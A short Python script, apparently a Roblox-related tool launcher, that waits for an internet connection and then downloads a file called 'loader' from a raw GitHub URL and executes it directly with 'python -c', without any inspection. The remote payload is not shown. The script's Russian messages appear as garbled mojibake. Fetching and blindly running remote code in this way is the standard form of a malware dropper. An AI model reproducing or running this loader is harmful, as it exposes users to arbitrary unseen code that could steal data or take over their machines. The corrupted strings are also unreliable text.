import time
import requests
import subprocess
import urllib.request
import os
os.system("cls")
def run_from_github(url):
    try:
        response = urllib.request.urlopen(url)
        script_content = response.read().decode('utf-8')
        subprocess.run(['python', '-c', script_content])
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ —Å–∫—Ä–∏–ø—Ç–∞ —Å GitHub: {e}")
def check_internet(url='http://www.google.com/', timeout=1):
    try:
        _ = requests.get(url, timeout=timeout)
        return True
    except requests.ConnectionError:
        return False

if not check_internet():
    print("–ù–µ—Ç –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞üõë. –û–∂–∏–¥–∞–Ω–∏–µ...")
    
while not check_internet():
    time.sleep(0.001)
    os.system("cls")
print("–ò–Ω—Ç–µ—Ä–Ω–µ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω!‚úÖ")
time.sleep(3)
github_url = "https://raw.githubusercontent.com/RBXROBLOXGAMER/python-tools/main/loader"
run_from_github(github_url)

